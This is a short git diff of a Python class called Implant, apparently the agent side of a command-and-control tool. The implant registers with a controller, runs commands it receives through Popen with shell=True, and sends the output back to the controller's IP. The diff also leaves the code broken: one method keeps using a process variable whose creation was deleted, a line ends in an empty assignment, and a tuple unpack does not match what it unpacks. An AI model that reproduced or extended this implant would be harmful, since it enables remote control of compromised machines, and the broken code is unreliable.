@@ -20,11 +20,11 @@ class Implant(Host):
         self.send(shellpack['ip'], "join")
 
     def run(self, cmd, timeout_sec):
-        proc = Popen(shlex.split(cmd), shell=True, stdout=PIPE, stderr=PIPE)
+        
         timer = Timer(timeout_sec, proc.kill)
         try:
             timer.start()
-            stdout, _ = proc.communicate()
+            stdout, _ = 
         finally:
             timer.cancel()
 
@@ -33,12 +33,9 @@ class Implant(Host):
     def instruction(self, shellpack):
         try:
             cmd = shellpack['data'].decode()
-            # cmds = cmd.split("|")
-            #cmd = cmd.split(" ")
-            output = self.run(cmd, 3)
-            if output is None:
-                print("doodoofard")
-            self.send(self.controller_ip, "instruction", output)
+            proc = Popen(shlex.split(cmd), shell=True, stdout=PIPE, stderr=PIPE)
+            stdout, _ = proc.communicate()[0]
+            self.send(self.controller_ip, "instruction", stdout)
         except TimeoutExpired:
             self.send(self.controller_ip, "instruction", b'The command has timed out', option="ERROR")
         except FileNotFoundError:
